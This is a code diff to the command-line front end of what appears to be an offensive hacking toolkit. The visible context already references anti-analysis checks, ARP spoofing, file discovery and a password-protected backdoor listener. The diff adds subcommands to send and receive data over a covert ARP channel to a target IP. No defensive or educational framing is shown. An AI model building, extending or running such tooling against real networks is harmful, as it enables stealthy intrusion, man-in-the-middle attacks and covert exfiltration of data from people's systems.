@@ -17,6 +17,7 @@ from modules.anti_analysis import run_anti_analysis_checks
 from modules.discovery import discover_files
 from modules.mitm import start_arp_spoof
 from modules.wizard import encode_wizard
+from modules.covert_channel import send_arp_covert, listen_arp_covert
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -118,6 +119,14 @@ def main():
     backdoor_parser = subparsers.add_parser("backdoor", help="Start the backdoor listener")
     backdoor_parser.add_argument("--port", type=int, default=5555, help="Port for the backdoor to listen on")
     backdoor_parser.add_argument("--password", required=True, help="Password for the backdoor")
+
+    # Covert Channel
+    send_arp_parser = subparsers.add_parser("send-arp", help="Send data via ARP covert channel")
+    send_arp_parser.add_argument("--target-ip", required=True, help="Target IP address")
+    send_arp_parser.add_argument("--payload", required=True, help="Payload to send")
+
+    listen_arp_parser = subparsers.add_parser("listen-arp", help="Listen for data from ARP covert channel")
+    listen_arp_parser.add_argument("--timeout", type=int, default=60, help="Timeout in seconds")
 
     # Discovery
     discover_parser = subparsers.add_parser("discover", help="Discover files")
@@ -228,6 +237,14 @@ def main():
 
         elif args.command == "backdoor":
             backdoor_listener(args.port, args.password)
+
+        elif args.command == "send-arp":
+            send_arp_covert(args.target_ip, args.payload.encode())
+
+        elif args.command == "listen-arp":
+            data = listen_arp_covert(args.timeout)
+            if data:
+                print(f"Received data: {data.decode(errors='ignore')}")
 
         elif args.command == "discover":
             files = discover_files(args.type, args.path)
